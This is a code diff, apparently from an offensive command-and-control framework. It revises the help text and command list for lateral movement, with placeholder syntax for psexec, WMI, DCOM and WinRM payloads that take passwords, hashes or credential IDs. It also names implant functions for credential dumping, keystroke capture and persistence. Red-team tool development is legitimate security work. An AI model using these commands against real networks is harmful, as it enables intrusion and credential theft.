@@ -409,27 +409,15 @@ invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -h
 posh_help6 = Colours.GREEN + """
 Lateral Movement - powershell.exe:
 =========================================================
-invoke-runaspayload -user <user> -password '<pass>' -domain <dom>
-invoke-runasproxypayload -user <user> -password '<pass>' -domain <dom>
-invoke-runasdaisypayload -user <user> -password '<pass>' -domain <dom>
+invoke-runaspayload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
+invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -credid <credid-optional>
+invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass> -credid <credid-optional>
 invoke-dcompayload -target <ip>
-invoke-dcomproxypayload -target <ip>
-invoke-dcomdaisypayload -target <ip>
-invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-psexecproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
-invoke-wmipayload -target <ip> -credid <credid>
-invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
 
 Lateral Movement - shellcode:
 =========================================================
-invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijspbindpayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
+invoke-wmijspayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
 """
 
 posh_help7 = Colours.GREEN + """
@@ -575,9 +563,8 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "get-pid", "listmodules", "modulesloaded", "startanotherimplant", "remove-persistence", "removeexe-persistence",
             "installexe-persistence", "get-hash", "get-creds", "resolve-ipaddress", "create-shortcut",
             "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
-            'invoke-psexecpayload', 'invoke-wmijsproxypayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload', 'invoke-psexecproxypayload', 'invoke-wmiproxypayload',
-            "get-ipconfig", 'invoke-dcomproxypayload', 'invoke-psexecdaisypayload', 'invoke-wmijsdaisypayload',
-            'invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
+            'invoke-psexecpayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload',
+            "get-ipconfig", 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
             "searchhistory"]
 
 # post help commands python implant
